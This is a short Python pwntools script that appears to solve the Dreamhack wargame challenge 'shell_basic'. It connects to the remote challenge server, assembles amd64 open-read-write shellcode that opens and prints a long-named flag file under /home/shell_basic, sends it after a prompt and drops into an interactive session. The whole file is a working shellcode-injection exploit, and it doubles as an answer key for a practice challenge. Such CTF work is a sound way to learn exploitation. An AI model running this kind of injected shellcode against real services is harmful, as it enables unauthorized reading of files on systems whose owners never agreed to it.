#!/usr/bin/python3

from pwn import *

p = remote("host1.dreamhack.games", 15205)
e = ELF("./shell_basic")
context.arch = 'amd64'

shell = shellcraft.pushstr("/home/shell_basic/flag_name_is_loooooong")
shell += shellcraft.open('rsp', '0', '0')
shell += shellcraft.read('rax', 'rsp', 0x30)
shell += shellcraft.write('1', 'rsp', 0x30)

p.sendlineafter(":", asm(shell))
p.interactive()
